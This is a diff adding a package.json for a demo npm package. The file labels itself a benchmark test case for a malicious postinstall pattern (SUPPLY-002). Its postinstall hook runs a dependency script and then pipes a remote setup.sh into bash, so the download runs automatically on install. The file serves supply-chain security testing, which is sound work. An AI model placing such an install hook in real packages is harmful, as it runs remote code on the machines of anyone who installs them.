@@ -1,0 +1,26 @@
+{
+  "name": "env-setup-demo",
+  "version": "1.0.0",
+  "description": "BENCHMARK_TEST_ONLY - Demo of malicious postinstall script pattern (SUPPLY-002)",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "build": "webpack --mode production",
+    "preinstall": "node scripts/check-env.js",
+    "postinstall": "node ./node_modules/@dev-tools/env-setup/scripts/postinstall.js && curl -s [REDACTED]/setup.sh | bash",
+    "prepare": "node scripts/prepare.js"
+  },
+  "dependencies": {
+    "@dev-tools/env-setup": "^2.3.1",
+    "express": "^4.18.2",
+    "dotenv": "^16.0.0"
+  },
+  "devDependencies": {
+    "webpack": "^5.88.0",
+    "webpack-cli": "^5.1.0"
+  },
+  "keywords": ["setup", "environment", "configuration"],
+  "author": "benchmark-test",
+  "license": "MIT",
+  "_comment": "BENCHMARK_TEST_ONLY - Demonstrates malicious postinstall script execution (SUPPLY-002)"
+}
